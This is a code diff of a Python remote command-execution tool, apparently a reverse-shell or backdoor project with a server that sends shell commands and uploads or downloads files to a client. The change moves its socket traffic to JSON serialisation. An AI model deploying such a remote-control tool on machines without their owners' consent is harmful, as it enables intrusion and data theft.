@@ -32,15 +32,15 @@ class Server:
 
 			if command.count("upload") > 0:
 				content = self.upload_file(command)
-				command = bytes(command, "utf-8") + b' ' + content + b'\n'
-			else:
-				command += "\n"
+				command += " "
+				command += content
+			
+			command += "\n"
 
 			response = self.rce(command)
 
-			if type(command) is not bytes:
-				if command.count("download") > 0:
-					response = self.download_file(command, response)
+			if command.count("download") > 0:
+				response = self.download_file(command, response)
 				
 			print(response)
 
@@ -61,24 +61,39 @@ class Server:
 			return base64.b64encode(up_file.read())
 	
 	
+	def serial_send(self, data):
+		json_obj = json.dumps(data)
+		self.connection.send(bytes(json_obj,"utf-8"))
+
+
+	def serial_recv(self):
+		json_obj = ""
+		while True:
+			try:
+				json_obj += self.connection.recv(4096).decode("utf-8")
+				return json.loads(json_obj)
+			except ValueError:
+				continue
+	
+	
 	def rce(self, command):
-		if type(command) is not bytes:
-			command = bytes(command, "utf-8")
-		self.connection.send(command)
+		# self.connection.send(bytes(command, "utf-8"))
+		self.serial_send(command)
 
 		if command == "exit\n":
 			self.connection.close()
 			print("Exiting")
 			exit()
 
-		response = ""
-		while True:
-			data = self.connection.recv(4096)
-			recv_len = len(data)
-			response += data.decode("utf-8")
-
-			if recv_len < 4096:
-				break
+		response = self.serial_recv()
+		#response = ""
+		#while True:
+		#	data = self.connection.recv(4096)
+		#	recv_len = len(data)
+		#	response += data.decode("utf-8")
+		#
+		#	if recv_len < 4096:
+		#		break
 
 		return response
 
@@ -99,13 +114,29 @@ class Client:
 		new_dir_name = self.exec_command("pwd")
 		return f"Changed directory to {new_dir} ({str(new_dir_name).rstrip()})"
 
+
+	def serial_send(self, data):
+		json_obj = json.dumps(data)
+		self.connection.send(bytes(json_obj,"utf-8"))
+
+
+	def serial_recv(self):
+		json_obj = ""
+		while True:
+			try:
+				json_obj += self.connection.recv(4096).decode("utf-8")
+				return json.loads(json_obj)
+			except ValueError:
+				continue
+
 	
 	def run(self):
 		while True:
-			command = ""
-			while "\n" not in command:
-				command += self.connection.recv(1024).decode("utf-8")
-			command = command.rstrip()
+			#command = ""
+			#while "\n" not in command:
+			#	command += self.connection.recv(1024).decode("utf-8")
+			#command = command.rstrip()
+			command = self.serial_recv()
 
 			try:
 				if command == "exit":
